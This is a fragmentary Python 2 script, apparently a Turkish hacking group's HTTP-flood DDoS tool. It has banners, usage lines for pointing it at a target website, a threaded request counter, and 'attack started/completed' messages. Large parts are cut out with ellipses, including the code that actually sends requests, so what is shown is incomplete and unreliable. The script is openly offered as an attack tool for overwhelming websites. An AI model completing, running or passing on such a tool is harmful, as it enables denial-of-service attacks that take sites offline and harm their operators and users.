####################################->
#4312644bf54db17180c8a95add9fdc06####-->Merhaba THG Ho?geldin
#9dfb17e500b557a9d985c08da4fd0aaf#####--->ByTurkHackGuvenlik.COM
#5afc3c0f68ff47b53b485fcd53e898a9######---->Cyb2004
#ff46a6b3100d11c29d4233c72f604a10#####--->Baybay THG Tekrar Bekleriz
#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
####################################->
#https://www.facebook.com/BySusmaz
...
def usage():
	print 'CYB2004 Tarafindan Kodlanmistir Powered ByTurkHackGuvenlik.Com'
	print 'CYB2004 Hackers https://www.facebook.com/BySusmaz'
	print 'Kullanim ( Linux ) : thgddoscyb2004.py http://siteadresi.alanadi/'
	print 'Kullanim (Termux ) : python2 thgddoscyb2004.py http://siteadresi.alanadi/'
	print "\a"
print \
"""                                                       
  & & & & &   &            &   & & & & & &   &   & 
...
def httpcall(url):
	...
	try:
			...
			set_flag(1)
 			...
 			print '                                                                    '
 			print '>>>>> HiC BiRSEY iMKANSiZ DEYiLDiR <<<<<'
 			print '>>>>> DDOSER TURKHACKGUVENLiK ATTACK <<<<<'
 			print '                                                                    '
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "#~~~> TURKHACKGUVENLiK BASLATiLiYOR... THG SALDiRi SAYiSi: %d ATiLiYOR<~~~#" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n ~>SALDiRi BASARiYLA TAMAMLANDi<~"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "THG SALDiRiSi BASLATiLiYOR"
		print "Created By CYB2004"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
